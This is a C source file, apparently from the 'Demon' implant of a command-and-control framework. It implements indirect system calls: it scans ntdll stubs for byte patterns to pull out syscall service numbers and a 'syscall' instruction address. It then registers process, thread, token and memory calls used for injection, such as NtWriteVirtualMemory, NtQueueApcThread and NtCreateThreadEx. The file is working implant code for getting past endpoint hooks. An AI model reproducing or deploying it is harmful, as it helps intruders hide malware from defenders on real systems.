#include <Demon.h>

#include <Common/Defines.h>
#include <Core/Syscalls.h>
#include <Core/Win32.h>

/*!
 * Initialize syscall addr + ssn
 * @param Ntdll
 * @return
 */
BOOL SysInitialize(
    IN PVOID Ntdll
) {
    PVOID SysNativeFunc   = NULL;
    PVOID SysIndirectAddr = NULL;

    /* Resolve Syscall instruction from dummy nt function */
    if ( ( SysNativeFunc = LdrFunctionAddr( Ntdll, H_FUNC_NTADDBOOTENTRY ) ) )
    {
        /* resolve address */
        SysExtract( SysNativeFunc, NULL, &SysIndirectAddr );

        /* check if we managed to resolve it  */
        if ( SysIndirectAddr ) {
            Instance.Syscall.SysAddress = SysIndirectAddr;
        } else {
            PUTS( "Failed to resolve SysIndirectAddr" );
        }
    }

#if _M_IX86
    if ( IsWoW64() )
    {
        Instance.Syscall.SysAddress = __readfsdword(0xC0);
    }
#endif

    /* Resolve Ssn */
    SYS_EXTRACT( NtOpenThread )
    SYS_EXTRACT( NtOpenThreadToken )
    SYS_EXTRACT( NtOpenProcess )
    SYS_EXTRACT( NtTerminateProcess )
    SYS_EXTRACT( NtOpenProcessToken )
    SYS_EXTRACT( NtDuplicateToken )
    SYS_EXTRACT( NtQueueApcThread )
    SYS_EXTRACT( NtSuspendThread )
    SYS_EXTRACT( NtResumeThread )
    SYS_EXTRACT( NtCreateEvent )
    SYS_EXTRACT( NtCreateThreadEx )
    SYS_EXTRACT( NtDuplicateObject )
    SYS_EXTRACT( NtGetContextThread )
    SYS_EXTRACT( NtSetContextThread )
    SYS_EXTRACT( NtQueryInformationProcess )
    SYS_EXTRACT( NtQuerySystemInformation )
    SYS_EXTRACT( NtWaitForSingleObject )
    SYS_EXTRACT( NtAllocateVirtualMemory )
    SYS_EXTRACT( NtWriteVirtualMemory )
    SYS_EXTRACT( NtReadVirtualMemory )
    SYS_EXTRACT( NtFreeVirtualMemory )
    SYS_EXTRACT( NtUnmapViewOfSection )
    SYS_EXTRACT( NtProtectVirtualMemory )
    SYS_EXTRACT( NtTerminateThread )
    SYS_EXTRACT( NtAlertResumeThread )
    SYS_EXTRACT( NtSignalAndWaitForSingleObject )
    SYS_EXTRACT( NtQueryVirtualMemory )
    SYS_EXTRACT( NtQueryInformationToken )
    SYS_EXTRACT( NtQueryInformationThread )
    SYS_EXTRACT( NtQueryObject )
    SYS_EXTRACT( NtClose )
    SYS_EXTRACT( NtSetEvent )
    SYS_EXTRACT( NtSetInformationThread )
    SYS_EXTRACT( NtSetInformationVirtualMemory )
    SYS_EXTRACT( NtGetNextThread )
}

/*!
 * extract syscall service number (SSN) and or
 * syscall instruction address
 * @param Function  Native function address to extract Ssn/SysAddr from
 * @param Ssn       extracted ssn
 * @param Addr      extracted sys addr
 * @return          if extracting the syscall was successful
 */
BOOL SysExtract(
    IN  PVOID  Function,
    OUT PWORD  Ssn,
    OUT PVOID* SysAddr
) {
    ULONG Offset      = { 0 };
    BYTE  SsnLow      = { 0 };
    BYTE  SsnHigh     = { 0 };
    BOOL  Success     = FALSE;

    /* check args */
    if ( ! Function )
        return FALSE;

    do {
        /* check if current instruction is a 'ret' (end of function) */
        if ( DREF_U8( Function + Offset ) == SYS_ASM_RET ) {
            break;
        }

#if _WIN64
        /* check current instructions for:
         *   mov r10, rcx
         *   mov rcx, [ssn]
         */
        if ( DREF_U8( Function + Offset + 0x0 ) == 0x4C &&
             DREF_U8( Function + Offset + 0x1 ) == 0x8B &&
             DREF_U8( Function + Offset + 0x2 ) == 0xD1 &&
             DREF_U8( Function + Offset + 0x3 ) == 0xB8 )
#else
        /* check current instructions for:
         *   mov eax, [ssn]
         */
        if ( DREF_U8( Function + Offset + 0x0 ) == 0xB8 )
#endif
        {
            /* if the Ssn param has been specified try to get the Ssn of the function */
            if ( Ssn )
            {
                SsnLow  = DREF_U8( Function + Offset + SSN_OFFSET_1 );
                SsnHigh = DREF_U8( Function + Offset + SSN_OFFSET_2 );
                *Ssn    = ( SsnHigh << 0x08 ) | SsnLow;
                Success = TRUE;
            }

            /* if SysAddr has been specified then try to get the native function syscall instruction */
            if ( SysAddr )
            {
                Success = FALSE;

#if _M_IX86
                if ( IsWoW64() )
                {
                    *SysAddr = __readfsdword(0xC0);
                    Success  = TRUE;
                    break;
                }
#endif

                for ( int i = 0; i < SYS_RANGE; i++ )
                {
                    /* check if the current ( function + offset + i ) is 'syscall' instruction */
                    if ( DREF_U16( Function + Offset + i ) == SYSCALL_ASM ) {
                        *SysAddr = C_PTR( Function + Offset + i );
                        Success  = TRUE;
                        break;
                    }
                }
            }

            /* we should be finished */
            break;
        }

        Offset++;
    } while ( TRUE );

    return Success;
}